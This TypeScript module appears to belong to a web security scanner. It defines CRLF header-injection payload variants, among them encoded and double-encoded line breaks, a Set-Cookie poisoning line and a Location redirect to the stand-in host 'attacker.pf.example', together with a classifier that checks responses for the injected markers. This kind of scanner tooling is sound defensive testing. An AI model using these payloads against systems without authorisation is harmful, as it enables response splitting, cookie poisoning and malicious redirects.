// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'crlf-header-injection',
  family: 'crlf-injection',
  title: 'CRLF header injection',
  severity: 'high',
  destructiveRisk: 'none',
  requiresOast: false,
  requiresBrowser: false,
  insertionPointKinds: ['query', 'body', 'header', 'cookie'],
  expectedSignals: ['injected-header-reflected', 'response-splitting', 'cookie-injection'],
  cwe: [113, 93],
};

const INJECTED_HEADER = 'X-PF-Injected: crlf-test-1';

export function variants(_ctx: ProbeContext): PayloadVariant[] {
  return [
    {
      id: 'crlf-basic-rn',
      family: 'crlf-injection',
      value: `pf_test\r\n${INJECTED_HEADER}`,
      encoding: 'raw',
      intent: 'Classic CRLF \\r\\n header injection',
      destructiveRisk: 'none',
      expectedSignals: ['injected-header-reflected', 'response-splitting'],
    },
    {
      id: 'crlf-url-encoded-rn',
      family: 'crlf-injection',
      value: `pf_test%0d%0a${encodeURIComponent(INJECTED_HEADER)}`,
      encoding: 'url',
      intent: 'URL-encoded %0d%0a CRLF injection',
      destructiveRisk: 'none',
      expectedSignals: ['injected-header-reflected'],
    },
    {
      id: 'crlf-double-encoded',
      family: 'crlf-injection',
      value: `pf_test%250d%250a${encodeURIComponent(INJECTED_HEADER)}`,
      encoding: 'double-url',
      intent: 'Double-URL-encoded CRLF bypass',
      destructiveRisk: 'none',
      expectedSignals: ['injected-header-reflected'],
    },
    {
      id: 'crlf-n-only',
      family: 'crlf-injection',
      value: `pf_test\n${INJECTED_HEADER}`,
      encoding: 'raw',
      intent: 'LF-only injection for servers stripping CR',
      destructiveRisk: 'none',
      expectedSignals: ['injected-header-reflected'],
    },
    {
      id: 'crlf-cookie-inject',
      family: 'crlf-injection',
      value: `pf_test\r\nSet-Cookie: pf_poison=1; Path=/`,
      encoding: 'raw',
      intent: 'CRLF cookie injection via response-splitting',
      destructiveRisk: 'none',
      expectedSignals: ['cookie-injection', 'response-splitting'],
    },
    {
      id: 'crlf-location-redirect',
      family: 'crlf-injection',
      value: `pf_test\r\nLocation: https://attacker.pf.example/`,
      encoding: 'raw',
      intent: 'CRLF injection to inject Location redirect header',
      destructiveRisk: 'none',
      expectedSignals: ['response-splitting'],
    },
    {
      id: 'crlf-unicode-ls',
      family: 'crlf-injection',
      value: `pf_test ${INJECTED_HEADER}`,
      encoding: 'raw',
      intent: 'Unicode line separator (U+2028) as CRLF substitute',
      destructiveRisk: 'none',
      expectedSignals: ['injected-header-reflected'],
    },
  ];
}

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  _baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  let responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.1;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  const injectedHeaderPresent = Object.keys(resp.headers).some(
    (h) => h.toLowerCase() === 'x-pf-injected',
  );
  const setCookie = resp.headers['set-cookie'] ?? '';
  const cookieInjected = setCookie.includes('pf_poison');
  const locationInjected = (resp.headers['location'] ?? '').includes('attacker.pf.example');

  if (injectedHeaderPresent) {
    responseClass = 'expected-proof';
    confidence = 0.95;
    nextAction = 'promote-finding';
    evidence.push(`Injected header "X-PF-Injected" present in response — CRLF injection confirmed (variant: ${variant.id})`);
  } else if (cookieInjected) {
    responseClass = 'expected-proof';
    confidence = 0.93;
    nextAction = 'promote-finding';
    evidence.push('pf_poison cookie injected via CRLF — response splitting confirmed');
  } else if (locationInjected) {
    responseClass = 'expected-proof';
    confidence = 0.90;
    nextAction = 'promote-finding';
    evidence.push('Location header injected via CRLF response splitting');
  } else {
    nextAction = 'stop-negative';
    evidence.push('No CRLF injection signal detected; server likely strips CR/LF');
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
